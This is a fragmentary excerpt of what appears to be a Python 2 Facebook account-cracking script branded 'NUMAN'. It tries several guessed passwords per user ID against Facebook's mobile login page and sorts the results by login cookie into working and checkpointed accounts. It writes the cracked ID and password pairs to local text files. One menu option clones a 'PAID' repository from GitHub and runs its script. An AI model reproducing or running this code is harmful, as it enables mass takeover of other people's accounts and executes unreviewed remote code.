...
def main_apv():
    ...
    try:
        ...
        os.system('xdg-open https://wa.me/+8801320686472')
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member In NUMAN Paid Commands '
        print '\x1b[1;91m        ENJOY  KRO BHI LOGO '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('rm -rf PAID')
        os.system('git clone https://github.com/Numan972/PAID')
        os.system('cp -f PAID/PAID \\.')
        os.system('rm -rf PAID')
        os.system(' cd PAID')
        os.system(' python2 NUMAN.py')
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[NUMAN-OK] ' + coc + user + ' | ' + pass1
                ok = open('NUMAN random-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[NUMAN-CP] ' + coc + user + ' | ' + pass1
                cp = open('NUMAN random-cp.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    print g + '[=] Extracting From NUMAN : ' + my_line[:15]
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[NUMAN-OK] ' + uid + ' | ' + pass1
                ok = open('NUMAN-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[NUMAN-CP] ' + uid + ' | ' + pass1
                cp = open('NUMAN-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[NUMAN-OK] ' + uid + ' | ' + pass2
                    ok = open('NUMAN-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[NUMAN-CP] ' + uid + ' | ' + pass2
                    cp = open('NUMAN-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[NUMAN-OK] ' + uid + ' | ' + pass3
                        ok = open('NUMAN-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[NUMAN-CP] ' + uid + ' | ' + pass3
                        cp = open('NUMAN-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[NUMAN-OK] ' + uid + ' | ' + pass4
                            ok = open('NUMAN-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[NUMAN-CP] ' + uid + ' | ' + pass4
                            cp = open('NUMAN-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[NUMAN-OK] ' + uid + ' | ' + pass5
                                ok = open('NUMAN-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[NUMAN-CP] ' + uid + ' | ' + pass5
                                cp = open('NUMAN-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;97m[NUMAN-CP] ' + uid + ' | ' + pass1
                cp = open('NUMAN-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    print '\x1b[1;97m[NUMAN-CP] ' + uid + ' | ' + pass2
                    cp = open('NUMAN-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        print '\x1b[1;97m[NUMAN-CP] ' + uid + ' | ' + pass3
                        cp = open('NUMAN-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;97m[NUMAN-CP] ' + uid + ' | ' + pass4
                            cp = open('NUMAN-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;97m[NUMAN-CP] ' + uid + ' | ' + pass5
                                cp = open('NUMAN-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[NUMAN-OK] ' + uid + ' | ' + pass6
                                    ok = open('IMTISZ-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[NUMAN-CP] ' + uid + ' | ' + pass6
                                    cp = open('NUMAN-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
